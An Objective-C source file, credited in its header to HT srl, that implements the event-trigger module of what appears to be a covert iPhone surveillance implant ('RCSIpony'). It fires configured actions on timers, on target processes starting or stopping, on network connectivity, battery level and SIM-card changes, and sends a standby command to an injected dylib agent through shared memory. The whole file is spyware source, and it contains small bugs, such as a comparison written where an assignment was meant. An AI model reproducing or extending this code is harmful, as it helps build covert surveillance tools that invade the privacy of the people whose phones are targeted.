/*
 * RCSIpony - Events
 *  Provides all the events which should trigger an action
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CoreFoundation/CoreFoundation.h>
#include <SystemConfiguration/SystemConfiguration.h>

#include <sys/param.h>
#include <sys/queue.h>
#include <sys/socket.h>

#import "RCSIEvents.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"
#import "RCSISharedMemory.h"

//#define DEBUG

#pragma mark -
#pragma mark Events Data Struct Definition
#pragma mark -

//
// struct for events data
//
typedef struct _timer {
  u_int type;
  u_int loDelay;
  u_int hiDelay;
  u_int endAction;
} timerStruct;

typedef struct _process {
  u_int onClose;
  u_int lookForTitle; // 1 for Title - 0 for Process Name
  u_int nameLength;
  char name[256];     // Name is unicode here
} processStruct;

typedef struct _connection {
  u_long typeOfConnection; // 1 for Wifi - 2 for GPRS - 3 for WiFI || GPRS
} connectionStruct;

typedef struct _smsEvent {
  u_int phoneNumberLength;  // cString Length
  NSString *phoneNumber;    // Unicode
  u_int smsTextLength;      // cString Length
  NSString *smsText;        // Unicode
} smsStruct;

typedef struct _call {
  u_int onClose;
  u_int phoneNumberLength; // cString Length
  NSString *phoneNumber;   // Unicode
} callStruct;

typedef struct _simChange {
  u_int onClose;
} simChangeStruct;

typedef struct _ac {
  u_int onClose;
} acStruct;

typedef struct _batteryLevel {
  u_int onClose;
  u_int minLevel;
  u_int maxLevel;
} batteryLevelStruct;

extern RCSISharedMemory *mSharedMemoryCommand;
static RCSIEvents *sharedEvents = nil;
static BOOL wifiFound = FALSE;
static BOOL gprsFound = FALSE;

NSLock *connectionLock;

@implementation RCSIEvents : RCSIEventsSupport

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (RCSIEvents *)sharedEvents
{
  @synchronized(self)
  {
    if (sharedEvents == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedEvents;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedEvents == nil)
      {
        sharedEvents = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedEvents;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Events monitor routines
#pragma mark -

- (void)eventTimer: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL timerDailyTriggered = NO;
  
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];

  [configuration retain];
  
  timerStruct *timerRawData;
  NSDate *startThreadDate = [NSDate date];
  NSTimeInterval interval = 0;
  
  while ([configuration objectForKey: @"status"]    != EVENT_STOP
         && [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      timerRawData = (timerStruct *)[[configuration objectForKey: @"data"] bytes];
      
      int actionID      = [[configuration objectForKey: @"actionID"] intValue];
      int type          = timerRawData->type;
      uint low          = timerRawData->loDelay;
      uint high         = timerRawData->hiDelay;
      uint endActionID  = timerRawData->endAction;
      
      switch (type)
        {
        case TIMER_AFTER_STARTUP:
          {
            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
            
            //NSLog(@"interval: %lf", fabs(interval));
            if (fabs(interval) >= low / 1000)
              {
                [taskManager triggerAction: actionID];
                
                [innerPool release];
                [outerPool release];
                
                [NSThread exit];
              }
            
            break;
          }
        case TIMER_LOOP:
          {
            interval = [[NSDate date] timeIntervalSinceDate: startThreadDate];
            //NSLog(@"interval: %lf", fabs(interval));
            
            if (fabs(interval) >= low / 1000)
              {
                startThreadDate = [[NSDate date] retain];
                
                [taskManager triggerAction: actionID];
              }
            
            break;
          }
        case TIMER_DATE:
          {
            int64_t configuredDate = 0;
            configuredDate = ((int64_t)high << 32) | (int64_t)low;

            int64_t unixDate = (configuredDate - EPOCH_DIFF) / RATE_DIFF;            
            NSDate *givenDate = [NSDate dateWithTimeIntervalSince1970: unixDate];
            NSDate *now = [NSDate date];
            
            if ([[now laterDate: givenDate] isEqual: now])
              {
#ifdef DEBUG
                NSLog(@"conf_timer_date triggered with action (%d)", actionID);
#endif
                
                [taskManager triggerAction: actionID];
                
                [innerPool release];
                [outerPool release];
                
                [NSThread exit];
              }
            
            break;
          }
        case TIMER_INST:
          {
            int64_t configuredDate = 0;
            // 100-nanosec unit from installation date
            configuredDate = ((int64_t)high << 32) | (int64_t)low;
            // seconds unit from installation date
            configuredDate = configuredDate*(0.0000001);
            
            NSDictionary *bundleAttrib =
            [[NSFileManager defaultManager] attributesOfItemAtPath: [[NSBundle mainBundle] executablePath]          
                                                             error: nil]; 
            
            NSDate *creationDate = [bundleAttrib objectForKey: NSFileCreationDate];
            
            if (creationDate == nil)
              break;
            
            NSDate *givenDate = [creationDate addTimeInterval: configuredDate];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_INST num of seconds %d, creationDate %@, givenDate %@", 
                    configuredDate, creationDate, givenDate);
#endif        
            NSDate *now = [NSDate date];
            
            if ([[now laterDate: givenDate] isEqualToDate: now])
            {
#ifdef DEBUG_EVENTS
              infoLog(@"TIMER_INST (%@) triggered", givenDate);
#endif
              [taskManager triggerAction: actionID];
              
              [innerPool release];
              [outerPool release];
              
              [NSThread exit];
            }
            
            break;
          }
        case TIMER_DAILY:
          {
            //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
            NSDate *now = [NSDate date];
            
            NSRange fixedRange;
            fixedRange.location = 11;
            fixedRange.length   = 8;
            
            // UTC timers
            NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
            
            NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
            [inFormat setTimeZone:timeZone];
            [inFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
            
            // Get current date string UTC
            NSString *currDateStr = [inFormat stringFromDate: now];
            [inFormat release];
            NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DAILY currDateStr %@ (now %@)", currDateStr, now);
#endif       
            // Set current date time to midnight
            [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DAILY dayStr %@", dayStr);
#endif  
            NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
            [outFormat setTimeZone:timeZone];
            [outFormat setDateFormat: @"yyyy-MM-dd hh:mm:ss ZZZ"];
            
            // Current midnite
            NSDate *dayDate = [outFormat dateFromString: dayStr];
            [outFormat release];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DAILY dayDate %@", dayDate);
#endif   
            [dayStr release];
            
            NSDate *highDay = [dayDate addTimeInterval: (high/1000)];
            NSDate *lowDay = [dayDate addTimeInterval: (low/1000)];
            
#ifdef DEBUG_EVENTS
            infoLog(@"TIMER_DAILY min %@ max %@ curr %@ endActionID %d", 
                    lowDay, highDay, [NSDate date], endActionID);
#endif            
                       
            if (timerDailyTriggered == NO &&
                [[now laterDate: lowDay] isEqualToDate: now] &&
                [[now earlierDate: highDay] isEqualToDate: now])
            {
#ifdef DEBUG_EVENTS
              infoLog(@"TIMER_DAILY actionID triggered");
#endif
              [taskManager triggerAction: actionID];
              
              timerDailyTriggered = YES;
              
            } 
            else if (timerDailyTriggered == YES && 
                     ([[now laterDate: highDay] isEqualToDate: now]||
                      [[now earlierDate: lowDay] isEqualToDate: now] ))
            {
#ifdef DEBUG_EVENTS
              infoLog(@"TIMER_DAILY endActionID triggered");
#endif
              [taskManager triggerAction: endActionID];
              
              timerDailyTriggered = NO;
            }
            
            break;
          }
        default:
          {
            [innerPool release];
            [outerPool release];
            
            [NSThread exit];
          }
        }
      
      usleep(300000);
      
      [innerPool release];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG
      NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      
      [configuration release];
    }
  
  [outerPool release];
}

- (void)eventProcess: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  //
  // Process name on iphone max size = 16
  //
  
  [configuration retain];
  
  int processAlreadyFound = 0;
  //BOOL titleFound;
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP &&
         [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];

      processStruct *processRawData;
      processRawData = (processStruct *)[[configuration objectForKey: @"data"] bytes];
      
      int actionID      = [[configuration objectForKey: @"actionID"] intValue];
      int onTermination = processRawData->onClose;
      int lookForTitle  = processRawData->lookForTitle;
      int nameLength    = processRawData->nameLength;
      
      NSData *tempData  = [NSData dataWithBytes: processRawData->name
                                         length: nameLength];
      
      NSString *process = [[NSString alloc] initWithData: tempData
                                                encoding: NSUTF16LittleEndianStringEncoding];
      
      switch (lookForTitle)
        {
        case PROCESS:
          {
#ifdef DEBUG
            NSLog(@"Looking for Process %@", process);
#endif
            if (processAlreadyFound != 0 && findProcessWithName(process) == NO)
              {
                processAlreadyFound = 0;
                
                if (onTermination != -1)
                  {
#ifdef DEBUG
                    NSLog(@"Application (%@) Terminated, action %d", process, onTermination);
#endif
                    [taskManager triggerAction: onTermination];
                  }
              }
            else if (processAlreadyFound == 0 && findProcessWithName(process) == YES)
              {
                processAlreadyFound = 1;
#ifdef DEBUG
                NSLog(@"Application (%@) Executed, action %d", process, actionID);
#endif    
                [taskManager triggerAction: actionID];
              }
            break;
          }
        case WIN_TITLE:
          {
#if 0
            titleFound = NO;
            //NSLog(@"Looking for Window Title");
            CFArrayRef windowList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly,
                                                               kCGNullWindowID);
            
            for (NSMutableDictionary *entry in (NSArray *)windowList)
              {
                NSString *windowName = [entry objectForKey: (id)kCGWindowName];
                
                if (matchPattern([[windowName lowercaseString] UTF8String],
                                 [[process lowercaseString] UTF8String]))
                //if (windowName != NULL && [windowName isCaseInsensitiveLike: process])
                  {
                    titleFound = YES;
                  }
              }
            
            CFRelease(windowList);
            
            if (processAlreadyFound != 0 && titleFound == NO)
              {
                processAlreadyFound = 0;
                
                if (onTermination != -1)
                  {
#ifdef DEBUG
                    NSLog(@"Window Title (%@) found (onTermination), action %d", process,
                          onTermination);
#endif
                    [taskManager triggerAction: onTermination];
                  }
              }
            else if (processAlreadyFound == 0 && titleFound == YES)
              {
                processAlreadyFound = 1;
#ifdef DEBUG
                NSLog(@"Window Title (%@) found, action %d", process, actionID);
#endif
                [taskManager triggerAction: actionID];
              }
#endif
            break;
          }
        default:
          break;
        }
      
      usleep(300000);
      
      [process release];
      [innerPool release];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG
      NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      [configuration release];
    }
  
  [outerPool release];
}

- (void)eventConnection: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  
  [configuration retain];
  connectionStruct *connectionRawData;

  // Create zero addy
  struct sockaddr_in zeroAddress;
  bzero(&zeroAddress, sizeof(zeroAddress));
  zeroAddress.sin_len = sizeof(zeroAddress);
  zeroAddress.sin_family = AF_INET;
  
  int actionID = [[configuration objectForKey: @"actionID"] intValue];
  
  while ([configuration objectForKey: @"status"] != EVENT_STOP &&
         [configuration objectForKey: @"status"] != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      connectionRawData = (connectionStruct *)[[configuration objectForKey: @"data"] bytes];
      u_int typeOfConnection = connectionRawData->typeOfConnection;
      
      // Recover reachability flags
      SCNetworkReachabilityRef defaultRouteReachability = SCNetworkReachabilityCreateWithAddress(NULL, (struct sockaddr *)&zeroAddress);
      SCNetworkReachabilityFlags flags;
      
      BOOL didRetrieveFlags = SCNetworkReachabilityGetFlags(defaultRouteReachability, &flags);
      CFRelease(defaultRouteReachability);
      
      if (didRetrieveFlags)
        {
          BOOL isReachable = flags & kSCNetworkFlagsReachable;
          BOOL needsConnection = flags & kSCNetworkFlagsConnectionRequired;
          BOOL nonWiFi = flags & kSCNetworkReachabilityFlagsTransientConnection;
#ifdef TEST
          BOOL onDemand = flags & kSCNetworkReachabilityFlagsConnectionOnDemand;
          BOOL onTraffic = flags & kSCNetworkReachabilityFlagsConnectionOnTraffic;
#endif
          
          switch (typeOfConnection)
            {
            case CONNECTION_WIFI:
              {
                if (isReachable && !needsConnection && !nonWiFi)
                  {
                    if (wifiFound == FALSE)
                      {
                        wifiFound = TRUE;
                        [taskManager triggerAction: actionID];
                      }
                  }
                else if (needsConnection)
                  {
                    if (wifiFound == TRUE)
                      wifiFound = FALSE;
                  }
                break;
              }
            case CONNECTION_GPRS:
              {
                if (isReachable && !needsConnection && nonWiFi)
                  {
                    if (gprsFound == FALSE)
                      {
                        gprsFound = TRUE;
                        //[taskManager triggerAction: actionID];
                      }
                  }
                else if (needsConnection)
                  {
                    if (gprsFound == TRUE)
                      gprsFound == FALSE;
                  }
                break;
              }
            default:
              break;
            }
#ifdef TEST
          NSLog(@"---------------------");
          NSLog(@"isReachable: %@", (isReachable ? @"YES" : @"NO"));
          NSLog(@"needsConnection: %@", (needsConnection ? @"YES" : @"NO"));
          NSLog(@"nonWifi: %@", (nonWiFi ? @"YES" : @"NO"));
          NSLog(@"onDemand: %@", (onDemand ? @"YES" : @"NO"));
          NSLog(@"onTraffic: %@", (onTraffic ? @"YES" : @"NO"));
          NSLog(@"---------------------");
#endif
        }
      
      usleep(500000);
      [innerPool release];
    }
  
  if ([[configuration objectForKey: @"status"] isEqualToString: EVENT_STOP])
    {
#ifdef DEBUG
      NSLog(@"Object Status: %@", [configuration objectForKey: @"status"]);
#endif
      [configuration setValue: EVENT_STOPPED forKey: @"status"];
      
      [configuration release];
    }
  
  [outerPool release];
}

- (void)dispatchRcsEvent: (UInt32)anEvent withObject: (id)anObject
{
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];

#ifdef DEBUG
  NSLog(@"%s: processing eventID %d", __FUNCTION__, anEvent);
#endif
  
  switch (anEvent) 
    {
    case BATTERY_CT_EVENT:
      {
        NSNumber *level = [(NSDictionary*)anObject objectForKey: @"kCTIndicatorsBatteryCapacity"];
        int levelVal = [level intValue];
        
#ifdef DEBUG
        NSLog(@"%s: battery level %@", __FUNCTION__, level);
#endif
        NSEnumerator *enumerator = [[taskManager mEventsList] objectEnumerator];
        
        id anObject;
        
        while (anObject = [enumerator nextObject])
          {
            NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
          
            if ([[anObject objectForKey: @"type"] intValue] == EVENT_BATTERY)
              {
#ifdef DEBUG
                NSLog(@"%s: battery event configuration %@", __FUNCTION__, anObject);
#endif
                [self eventBattery: anObject withLevel: levelVal];
                
                break;
              }
            
            [innerPool release];
          }
      } break;
    case SIM_CT_EVENT:
      {
#ifdef DEBUG
        NSLog(@"%s: sim change", __FUNCTION__);
#endif
      
        NSEnumerator *enumerator = [[taskManager mEventsList] objectEnumerator];
        id anObject;
      
        while (anObject = [enumerator nextObject])
          {
            NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
          
            if ([[anObject objectForKey: @"type"] intValue] == EVENT_SIM_CHANGE)
              {
#ifdef DEBUG
                NSLog(@"%s: sim change event configuration %@", __FUNCTION__, anObject);
#endif
                [self eventSimChange: anObject];
              
                break;
              }
          
            [innerPool release];
          }
      } break;
    }
}

- (void)eventBattery: (NSDictionary *)configuration withLevel: (int)aLevel
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [configuration retain];

  if ([configuration objectForKey: @"status"]     != EVENT_STOP
      && [configuration objectForKey: @"status"]  != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
      
      batteryLevelStruct *processRawData;
      processRawData = (batteryLevelStruct *)[[configuration objectForKey: @"data"] bytes];
      
      NSNumber *actionID = [configuration objectForKey: @"actionID"];
      int minLevel      = processRawData->minLevel;
      int maxLevel      = processRawData->maxLevel;
    
#ifdef DEBUG
      NSLog(@"%s: battery event conf min %d, max %d", __FUNCTION__, minLevel, maxLevel);
#endif
    
      if (minLevel   <= aLevel
          &&  aLevel <= maxLevel) 
        {
#ifdef DEBUG
          NSLog(@"%s: battery event trigger action id %d", __FUNCTION__, actionID);
#endif
        
          [NSThread detachNewThreadSelector: @selector(eventExecActionOnNewThread:) 
                                   toTarget: self 
                                 withObject: (id)actionID];
        }
    
      [innerPool release];
    }
  
  [configuration release];
  [outerPool release];
}

- (void)eventSimChange: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [configuration retain];
  
  if ([configuration objectForKey: @"status"]     != EVENT_STOP
      && [configuration objectForKey: @"status"]  != EVENT_STOPPED)
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      NSNumber *actionID = [configuration objectForKey: @"actionID"];
    
#ifdef DEBUG
      NSLog(@"%s: sim change event trigger action id %d", __FUNCTION__, actionID);
#endif
    
      [NSThread detachNewThreadSelector: @selector(eventExecActionOnNewThread:) 
                               toTarget: self 
                             withObject: (id)actionID];
      
      [innerPool release];
    }
  
  [configuration release];
  [outerPool release];
}

- (void)eventStandBy: (NSDictionary *)configuration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  NSMutableData *standByCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
  
  shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[standByCommand bytes];
  shMemoryHeader->agentID         = OFFT_STANDBY;
  shMemoryHeader->direction       = D_TO_AGENT;
  shMemoryHeader->command         = AG_START;
  shMemoryHeader->commandDataSize = sizeof(standByStruct);
  
#ifdef DEBUG
  NSLog(@"%s: configuration %@", __FUNCTION__, configuration);
#endif
  
  standByStruct tmpStruct;
  
  tmpStruct.actionOnLock    = [[configuration objectForKey: @"actionID"] intValue];
  
  if ([configuration objectForKey: @"data"])
    memcpy(&tmpStruct.actionOnUnlock, [[configuration objectForKey: @"data"] bytes], sizeof(UInt32));
  else
    tmpStruct.actionOnUnlock = CONF_ACTION_NULL;
  
  memcpy(shMemoryHeader->commandData, &tmpStruct, sizeof(tmpStruct));
  
#ifdef DEBUG
  NSLog(@"%s: sending standby command to dylib with actionLock %lu, actionUnlock %lu",
        __FUNCTION__, tmpStruct.actionOnLock, tmpStruct.actionOnUnlock);
#endif
  
  if ([mSharedMemoryCommand writeMemory: standByCommand
                                 offset: OFFT_STANDBY
                          fromComponent: COMP_CORE])
  {
#ifdef DEBUG
    NSLog(@"%s: sending standby command to dylib: done!", __FUNCTION__);
#endif
  }
  else 
  {
#ifdef DEBUG
    NSLog(@"%s: sending standby command to dylib: error!", __FUNCTION__);
#endif
  }
  
  [standByCommand release]; 

  [outerPool release];
}

- (void)eventExecActionOnNewThread: (NSNumber *)anAction
{
  int actionID = [anAction intValue];
  
#ifdef DEBUG
  NSLog(@"%s: eventid %d", actionID);
#endif
  
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  [taskManager triggerAction: actionID];
}

@end
